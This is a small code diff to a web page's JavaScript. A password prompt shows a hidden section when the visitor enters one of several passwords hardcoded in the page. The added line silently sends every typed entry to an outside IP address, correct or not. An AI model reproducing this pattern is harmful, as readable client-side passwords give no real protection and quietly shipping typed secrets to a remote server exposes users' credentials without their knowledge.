@@ -31,8 +31,9 @@ text-decoration:none;
 <script type="text/javascript">
 function disp_prompt(){
   var name=prompt("请输入密码","")
-  if (name!=null && name=="panzhaoli")
+  if (name!=null && (name=="panzhaoli" || name=="PZL" || name=="pzl" || name=="tangjiankang" || name=="tjk"))
 	 $("#panzhaoli").show();
+	 $.get("http://47.98.189.127/tjk.do", { "name": name} );
   }
 
 $(function(){
